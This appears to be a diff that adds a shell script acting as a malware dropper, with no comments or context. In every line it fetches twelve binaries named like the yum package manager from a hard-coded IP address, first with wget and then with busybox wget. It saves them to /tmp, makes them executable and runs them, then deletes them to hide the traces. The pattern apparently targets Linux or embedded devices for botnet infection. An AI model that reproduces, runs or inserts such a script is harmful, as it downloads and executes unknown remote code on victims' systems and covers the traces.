@@ -1,0 +1,28 @@
+#!/bin/sh
+wget -q http://201.156.151.231/yum1 -P /tmp && chmod +x /tmp/yum1 && /tmp/yum1
+wget -q http://201.156.151.231/yum2 -P /tmp && chmod +x /tmp/yum2 && /tmp/yum2
+wget -q http://201.156.151.231/yum3 -P /tmp && chmod +x /tmp/yum3 && /tmp/yum3
+wget -q http://201.156.151.231/yum4 -P /tmp && chmod +x /tmp/yum4 && /tmp/yum4
+wget -q http://201.156.151.231/yum5 -P /tmp && chmod +x /tmp/yum5 && /tmp/yum5
+wget -q http://201.156.151.231/yum6 -P /tmp && chmod +x /tmp/yum6 && /tmp/yum6
+wget -q http://201.156.151.231/yum7 -P /tmp && chmod +x /tmp/yum7 && /tmp/yum7
+wget -q http://201.156.151.231/yum8 -P /tmp && chmod +x /tmp/yum8 && /tmp/yum8
+wget -q http://201.156.151.231/yum9 -P /tmp && chmod +x /tmp/yum9 && /tmp/yum9
+wget -q http://201.156.151.231/yum10 -P /tmp && chmod +x /tmp/yum10 && /tmp/yum10
+wget -q http://201.156.151.231/yum11 -P /tmp && chmod +x /tmp/yum11 && /tmp/yum11
+wget -q http://201.156.151.231/yum12 -P /tmp && chmod +x /tmp/yum12 && /tmp/yum12
+sleep 1;
+busybox wget -q http://201.156.151.231/yum1 -P /tmp && chmod +x /tmp/yum1 && /tmp/yum1
+busybox wget -q http://201.156.151.231/yum2 -P /tmp && chmod +x /tmp/yum2 && /tmp/yum2
+busybox wget -q http://201.156.151.231/yum3 -P /tmp && chmod +x /tmp/yum3 && /tmp/yum3
+busybox wget -q http://201.156.151.231/yum4 -P /tmp && chmod +x /tmp/yum4 && /tmp/yum4
+busybox wget -q http://201.156.151.231/yum5 -P /tmp && chmod +x /tmp/yum5 && /tmp/yum5
+busybox wget -q http://201.156.151.231/yum6 -P /tmp && chmod +x /tmp/yum6 && /tmp/yum6
+busybox wget -q http://201.156.151.231/yum7 -P /tmp && chmod +x /tmp/yum7 && /tmp/yum7
+busybox wget -q http://201.156.151.231/yum8 -P /tmp && chmod +x /tmp/yum8 && /tmp/yum8
+busybox wget -q http://201.156.151.231/yum9 -P /tmp && chmod +x /tmp/yum9 && /tmp/yum9
+busybox wget -q http://201.156.151.231/yum10 -P /tmp && chmod +x /tmp/yum10 && /tmp/yum10
+busybox wget -q http://201.156.151.231/yum11 -P /tmp && chmod +x /tmp/yum11 && /tmp/yum11
+busybox wget -q http://201.156.151.231/yum12 -P /tmp && chmod +x /tmp/yum12 && /tmp/yum12
+sleep 3;
+rm -rf /tmp/yum*
